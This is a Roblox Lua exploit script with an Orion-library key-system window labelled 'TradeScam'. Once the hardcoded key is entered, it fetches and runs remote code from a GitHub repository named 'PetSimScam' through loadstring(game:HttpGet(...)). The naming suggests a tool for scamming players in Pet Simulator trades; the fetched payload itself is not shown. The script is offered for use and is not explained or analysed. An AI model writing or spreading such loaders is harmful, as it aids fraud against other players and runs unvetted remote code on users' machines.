local Player = game.Players.LocalPlayer
local Window = OrionLib:MakeWindow({Name = "| KeySystem | TradeScam |", HidePremium = false, IntroText = "KeySystem."})

OrionLib:MakeNotification({
	Name = "Executed Script!",
	Content = "You Have Logged In As "..Player.Name.." ",
	Image = "rbxassetid://4483345998",
	Time = 5
})

_G.Key = "e>i*{^NiWl9NmdN&8ML*e0['f4/[Y]1$GNho.w3(Gg3Kx}GCL:onJc:}d<qg*"
_G.KeyInput = "string"

function MakeScriptHub()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZwYqOnDiscord/PetSimScam/main/TradeLoader", true))()
end

function IncorrectKeyNotify()
    OrionLib:MakeNotification({
        Name = "Incorrect Key!",
        Content = "Check If You Entered The Wrong Key.",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
end

function CorrectKeyNotify()
    OrionLib:MakeNotification({
        Name = "Correct Key!",
        Content = "Enjoy Our TradeScam Script.",
        Image = "rbxassetid://4483345998",
        Time = 5
    })
end

local KeyTab = Window:MakeTab({
	Name = "KeySystem.",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

KeyTab:AddTextbox({
	Name = "Enter The Key You Received : ",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		_G.KeyInput = Value
	end	  
})

KeyTab:AddButton({
	Name = "Check Key.",
	Callback = function()
      		if _G.KeyInput == _G.Key then
                MakeScriptHub()
                CorrectKeyNotify()
            else
                IncorrectKeyNotify()
            end
  	end    
})

OrionLib:Init()
